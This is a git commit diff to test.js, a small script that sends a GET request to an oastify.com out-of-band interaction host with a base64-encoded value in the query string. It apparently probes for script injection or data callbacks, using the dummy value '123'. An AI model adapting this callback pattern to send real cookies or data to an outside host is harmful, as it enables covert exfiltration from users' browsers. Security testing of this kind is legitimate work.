de25f503458787c87daefb27847e9c4a5595c982
Akmal Mohamed <akmal.m.abdulaleam@gmail.com>
2023-01-10 15:48:51 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,9 +1,10 @@
 <script>
+	var url = "https://39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/?testing=" + btoa("123");
 	function reqListener() {
 		console.log("done");
 	};
 	const req = new XMLHttpRequest();
 	req.addEventListener("load", reqListener);
-	req.open("GET", "https://39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/?lssss="+btoa("123"));
+	req.open("GET", url);
 	req.send();
 </script>
